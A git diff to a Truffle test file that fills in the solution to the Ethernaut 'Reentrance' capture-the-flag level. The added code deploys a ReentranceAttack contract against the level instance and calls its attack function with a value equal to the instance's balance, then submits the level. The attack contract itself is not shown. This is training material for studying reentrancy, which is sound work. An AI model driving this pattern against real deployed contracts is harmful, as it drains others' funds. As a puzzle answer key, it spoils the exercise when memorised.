@@ -1,5 +1,6 @@
 const ReentranceFactory = artifacts.require('ReentranceFactory')
 const Reentrance = artifacts.require('Reentrance')
+const ReentranceAttack = artifacts.require('ReentranceAttack')
 
 const utils = require('../utils/TestUtils')
 
@@ -20,7 +21,14 @@ contract('Reentrance', function ([player]) {
       value: web3.utils.toWei(insertCoin, 'ether'),
     })
 
-    // INSERT YOUR SOLUTION HERE
+    const attacker = await ReentranceAttack.new(instance.address, {
+      from: player,
+    })
+    const balance = await web3.eth.getBalance(instance.address)
+    await attacker.attack({
+      from: player,
+      value: balance,
+    })
 
     const completed = await utils.submitLevelInstance(
       ethernaut,
